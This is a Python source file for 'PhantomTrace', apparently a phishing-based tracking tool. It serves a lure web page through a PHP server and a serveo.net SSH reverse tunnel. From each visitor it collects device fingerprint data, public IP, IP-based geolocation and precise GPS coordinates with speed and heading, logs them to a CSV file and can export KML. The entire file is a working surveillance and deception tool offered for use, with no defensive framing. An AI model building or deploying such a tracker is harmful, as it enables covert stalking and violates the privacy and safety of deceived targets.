#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# ===============================
# PhantomTrace :: Core
# Signature :: ch3ckm8
# ===============================

R = '\033[31m'
G = '\033[31m'
C = '\033[0m'
W = '\033[0m'

from shutil import which

print(G + '[+]' + C + ' Initializing PhantomTrace Core...' + W)
pkgs = ['python3', 'pip3', 'php', 'ssh']
inst = True
for pkg in pkgs:
	present = which(pkg)
	if present is None:
		print(R + '[-] ' + W + pkg + C + ' not found!')
		inst = False
if not inst:
	exit()

import os
import csv
import sys
import time
import json
import argparse
import requests
import subprocess as subp

# ===============================
# Metadata
# ===============================
TOOL_NAME = 'PhantomTrace'
ENGINE    = 'PT-Core'
version   = '1.3.0-stable'
__author__ = 'ch3ckm8'
__sig__    = 'PT::ch3ckm8::2025'

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--subdomain', help='Custom subdomain (optional)')
parser.add_argument('-k', '--kml', help='KML output filename (optional)')
parser.add_argument('-t', '--tunnel', help='Tunnel mode [manual]')
parser.add_argument('-p', '--port', type=int, default=8080, help='Web server port')

args = parser.parse_args()
subdom = args.subdomain
kml_fname = args.kml
tunnel_mode = args.tunnel
port = args.port

row = []
info = ''
result = ''

# ===============================
# Banner
# ===============================
def banner():
	print(G + r'''
██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
''' + W)
	print(G + '[>]' + C + ' Tool      : ' + W + TOOL_NAME)
	print(G + '[>]' + C + ' Engine    : ' + W + ENGINE)
	print(G + '[>]' + C + ' Version   : ' + W + version)
	print(G + '[>]' + C + ' Operator  : ' + W + 'ch3ckm8\n')

# ===============================
# Version check (safe / neutral)
# ===============================
def ver_check():
	print(G + '[+]' + C + ' Integrity Check.............' + W)
	time.sleep(0.5)
	print(C + '[' + G + ' OK ' + C + ']\n')

# ===============================
# Tunnel
# ===============================
def tunnel_select():
	if tunnel_mode is None:
		serveo()
	elif tunnel_mode == 'manual':
		print(G + '[+]' + C + ' Manual tunnel mode enabled.\n' + W)
	else:
		print(R + '[!]' + C + ' Invalid tunnel mode.\n' + W)
		exit()

# ===============================
# Templates
# ===============================
def template_select():
	global site, info, result

	print(G + '[+]' + C + ' Select Interface Module:\n' + W)

	with open('templates/templates.json', 'r') as templ:
		templ_json = json.loads(templ.read())

	for item in templ_json['templates']:
		print(G + '[{}]'.format(templ_json['templates'].index(item)) +
		      C + ' {}'.format(item['name']) + W)

	selected = int(input(G + '[>] ' + W))

	try:
		site = templ_json['templates'][selected]['dir_name']
	except IndexError:
		print(R + '[-]' + C + ' Invalid selection.' + W)
		sys.exit()

	print(G + '[+]' + C + f' Loading module: {templ_json["templates"][selected]["name"]}\n' + W)

	if templ_json['templates'][selected]['module']:
		import importlib
		importlib.import_module('template.{}'.format(
			templ_json['templates'][selected]['import_file']
		))

	info = f'templates/{site}/php/info.txt'
	result = f'templates/{site}/php/result.txt'

# ===============================
# Serveo
# ===============================

def serveo():
	global subdom
	flag = False

	print(G + '[+]' + C + ' Checking tunnel availability...', end='')
	try:
		requests.get('https://serveo.net', timeout=5)
		print(C + '[ ' + G + 'Online' + C + ' ]\n' + W)
	except:
		print(C + '[ ' + R + 'Offline' + C + ' ]\n' + W)
		exit()

	print(G + '[+]' + C + ' Establishing tunnel...\n' + W)

	with open('logs/serveo.txt', 'w') as tmpfile:
		cmd = ['ssh', '-o', 'StrictHostKeyChecking=no',
		       '-o', 'ServerAliveInterval=60']
		if subdom:
			cmd += ['-R', f'{subdom}.serveo.net:80:localhost:{port}']
		else:
			cmd += ['-R', f'80:localhost:{port}']
		cmd.append('serveo.net')
		subp.Popen(cmd, stdout=tmpfile, stderr=tmpfile)

	while True:
		with open('logs/serveo.txt') as f:
			for line in f.readlines():
				if 'HTTP' in line and not flag:
					url = line.split(' ')[4].strip()
					print(G + '[+]' + C + ' Endpoint : ' + W + url + '\n')
					flag = True
		if flag:
			break
		time.sleep(2)

# ===============================
# Server
# ===============================
def server():
	print(G + '[+]' + C + ' Web Server Port : ' + W + str(port))
	print(G + '[+]' + C + ' Launching PHP backend...', end='')

	with open('logs/php.log', 'w') as phplog:
		subp.Popen(['php', '-S', f'0.0.0.0:{port}', '-t', f'templates/{site}/'],
		           stdout=phplog, stderr=phplog)

	time.sleep(3)
	try:
		requests.get(f'http://0.0.0.0:{port}')
		print(C + '[ ' + G + 'OK' + C + ' ]' + W)
	except:
		print(C + '[ ' + R + 'FAIL' + C + ' ]' + W)
		Quit()

# ===============================
# Flow Control
# ===============================

def wait():
	printed = False
	while True:
		time.sleep(2)
		if os.path.getsize(result) == 0 and not printed:
			print(G + '[+]' + C + ' Awaiting target interaction...\n' + W)
			printed = True
		if os.path.getsize(result) > 0:
			main()

# ===============================
# MAIN 
# ===============================

def main():
    global info, result, row

    row = []
    var_lat = None
    var_lon = None

    # =========================
    # DEVICE INFORMATION
    # =========================
    try:
        if not os.path.exists(info) or os.path.getsize(info) == 0:
            return

        with open(info, 'r') as f:
            data = json.loads(f.read())
    except Exception:
        return

    for value in data.get('dev', []):

        var_os       = value.get('os', 'N/A')
        var_platform = value.get('platform', 'N/A')
        var_cores    = value.get('cores', 'Not Available')
        var_ram      = value.get('ram', 'N/A')
        var_vendor   = value.get('vendor', 'N/A')
        var_render   = value.get('render', 'N/A')
        var_res      = f"{value.get('wd','?')}x{value.get('ht','?')}"
        var_browser  = value.get('browser', 'N/A')
        var_ip       = value.get('ip', 'N/A')

        row.extend([
            var_os, var_platform, var_cores, var_ram,
            var_vendor, var_render, var_res,
            var_browser, var_ip
        ])

        print(G + '[+]' + C + ' Device Information :\n' + W)
        print(G + '[+]' + C + ' OS         : ' + W + var_os)
        print(G + '[+]' + C + ' Platform   : ' + W + var_platform)
        print(G + '[+]' + C + ' CPU Cores  : ' + W + str(var_cores))
        print(G + '[+]' + C + ' RAM        : ' + W + var_ram)
        print(G + '[+]' + C + ' GPU Vendor : ' + W + var_vendor)
        print(G + '[+]' + C + ' GPU        : ' + W + var_render)
        print(G + '[+]' + C + ' Resolution : ' + W + var_res)
        print(G + '[+]' + C + ' Browser    : ' + W + var_browser)
        print(G + '[+]' + C + ' Public IP  : ' + W + var_ip)

        # =========================
        # IP GEOLOOKUP (ROBUSTO)
        # =========================
        try:
            r = requests.get(f'https://ipwho.is/{var_ip}', timeout=6)
            j = r.json() if r.status_code == 200 else {}

            var_continent = j.get('continent', 'N/A')
            var_country   = j.get('country', 'N/A')
            var_region    = j.get('region', 'N/A')
            var_city      = j.get('city', 'N/A')
            var_org       = j.get('org', 'N/A')
            var_isp       = j.get('isp', 'N/A')

        except Exception:
            var_continent = var_country = var_region = 'N/A'
            var_city = var_org = var_isp = 'N/A'

        row.extend([
            var_continent, var_country, var_region,
            var_city, var_org, var_isp
        ])

        print(G + '[+]' + C + ' Continent  : ' + W + var_continent)
        print(G + '[+]' + C + ' Country    : ' + W + var_country)
        print(G + '[+]' + C + ' Region     : ' + W + var_region)
        print(G + '[+]' + C + ' City       : ' + W + var_city)
        print(G + '[+]' + C + ' Org        : ' + W + var_org)
        print(G + '[+]' + C + ' ISP        : ' + W + var_isp)

    # =========================
    # LOCATION INFORMATION
    # =========================
    try:
        if not os.path.exists(result) or os.path.getsize(result) == 0:
            csvout()
            repeat()
            return

        with open(result, 'r') as f:
            data = json.loads(f.read())
    except Exception:
        csvout()
        repeat()
        return

    for value in data.get('info', []):

        lat = value.get('lat')
        lon = value.get('lon')

        if not lat or not lon:
            continue

        var_lat = lat + ' deg'
        var_lon = lon + ' deg'
        var_acc = value.get('acc', 'N/A') + ' m'

        alt = value.get('alt')
        var_alt = alt + ' m' if alt else 'Not Available'

        direction = value.get('dir')
        var_dir = direction + ' deg' if direction else 'Not Available'

        speed = value.get('spd')
        var_spd = speed + ' m/s' if speed else 'Not Available'

        row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])

        print('\n' + G + '[+]' + C + ' Location Information :\n' + W)
        print(G + '[+]' + C + ' Latitude  : ' + W + var_lat)
        print(G + '[+]' + C + ' Longitude : ' + W + var_lon)
        print(G + '[+]' + C + ' Accuracy  : ' + W + var_acc)
        print(G + '[+]' + C + ' Altitude  : ' + W + var_alt)
        print(G + '[+]' + C + ' Direction : ' + W + var_dir)
        print(G + '[+]' + C + ' Speed     : ' + W + var_spd)

    # =========================
    # FINAL OUTPUT
    # =========================
    if var_lat and var_lon:
        print('\n' + G + '[+]' + C + ' Google Maps.................: ' + W +
              'https://www.google.com/maps/place/' +
              var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))

        if kml_fname:
            kmlout(var_lat, var_lon)

    csvout()
    repeat()

def kmlout(var_lat, var_lon):
	with open('templates/sample.kml', 'r') as kml_sample:
		kml_sample_data = kml_sample.read()

	kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
	kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

	with open('{}.kml'.format(kml_fname), 'w') as kml_gen:
		kml_gen.write(kml_sample_data)

	print(G + '[+]' + C + ' KML File Generated..........: ' + W + os.getcwd() + '/{}.kml'.format(kml_fname))

# ===============================
# Output / Utils
# ===============================
def csvout():
	global row
	with open('db/results.csv', 'a') as csvfile:
		csv.writer(csvfile).writerow(row + ['PT:ch3ckm8'])

def clear():
	open(result, 'w').close()
	open(info, 'w').close()

def repeat():
	clear()
	wait()
	main()

def Quit():
	global result
	with open (result, 'w+'): pass
	os.system('pkill php')
	exit()

# ===============================
# Entry Point
# ===============================
try:
	banner()
	ver_check()
	tunnel_select()
	template_select()
	server()
	wait()

except KeyboardInterrupt:
	print('\n' + R + '[!]' + C + ' Interrupted by operator.' + W)
	Quit()
